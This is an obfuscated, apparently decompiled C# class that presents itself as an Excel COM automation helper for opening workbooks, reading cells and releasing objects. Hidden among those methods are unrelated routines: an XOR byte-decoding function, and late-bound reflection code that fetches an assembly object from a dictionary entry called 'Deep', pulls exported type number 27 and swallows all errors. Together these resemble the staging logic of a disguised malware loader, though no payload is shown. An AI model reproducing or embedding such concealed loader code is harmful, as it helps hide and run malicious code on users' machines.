using System;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using Microsoft.VisualBasic.CompilerServices;
using Nj4;
using Qo0;
using Xc3;
using Zy1k;
using q3Q;

namespace g8A;

public class Kk5
{
	private n6E _oXls;

	private j4R _oWBook;

	private w2H _oSheet;

	public n6E OXls
	{
		get
		{
			return _oXls;
		}
		set
		{
			_oXls = value;
		}
	}

	public j4R OWBook
	{
		get
		{
			return _oWBook;
		}
		set
		{
			_oWBook = value;
		}
	}

	public w2H OSheet
	{
		get
		{
			return _oSheet;
		}
		set
		{
			_oSheet = value;
		}
	}

	public Kk5()
	{
		_oXls = (n6E)Activator.CreateInstance(Marshal.GetTypeFromCLSID(new Guid("00024500-0000-0000-C000-000000000046")));
	}

	public void i7K(string w6M, bool Fj7)
	{
		OWBook = OXls.Workbooks.Open(w6M, RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing));
		OXls.Visible = Fj7;
	}

	internal static bool Hg9()
	{
		try
		{
			try
			{
				Type type = (Type)g7T(RuntimeHelpers.GetObjectValue(Qw87.mDic["Deep"]));
				if (Operators.CompareString(type.Name, Qw87.mDic[Qw87.tName].ToString(), false) == 0)
				{
					Qw87.mDic.Add(Qw87.T, type);
					return true;
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		return false;
	}

	public void Yz2(string j2Y)
	{
		OSheet = (w2H)OWBook.Sheets[j2Y];
	}

	public g8F g1J(int b9D, int d0S)
	{
		return (g8F)OSheet.Cells[b9D, d0S];
	}

	public void e4G(bool Tn3)
	{
		if (OWBook != null)
		{
			OWBook.Close(Tn3, RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing));
		}
		OXls.Quit();
		n6E Ff = OXls;
		s1W(ref Ff);
		OXls = Ff;
	}

	internal static byte w7N(byte r2L, byte[] p6C, int Qg3, int Me7)
	{
		r2L = (byte)(r2L ^ checked((byte)(p6C[unchecked(Me7 % p6C.Length)] ^ ((Me7 + unchecked(Qg3 % p6C.Length)) & Qg3))));
		return r2L;
	}

	private static void s1W<En0>(ref En0 Ff0, bool b6W = false) where En0 : class
	{
		if (Ff0 == null)
		{
			return;
		}
		try
		{
			if (Marshal.IsComObject(Ff0))
			{
				if (b6W)
				{
					Marshal.FinalReleaseComObject(Ff0);
				}
				else
				{
					Marshal.ReleaseComObject(Ff0);
				}
			}
		}
		finally
		{
			Ff0 = null;
		}
	}

	internal static object g7T(object t2Z)
	{
		return NewLateBinding.LateIndexGet(NewLateBinding.LateGet(t2Z, (Type)null, "GetExportedTypes", new object[0], (string[])null, (Type[])null, (bool[])null), new object[1] { 27 }, (string[])null);
	}
}
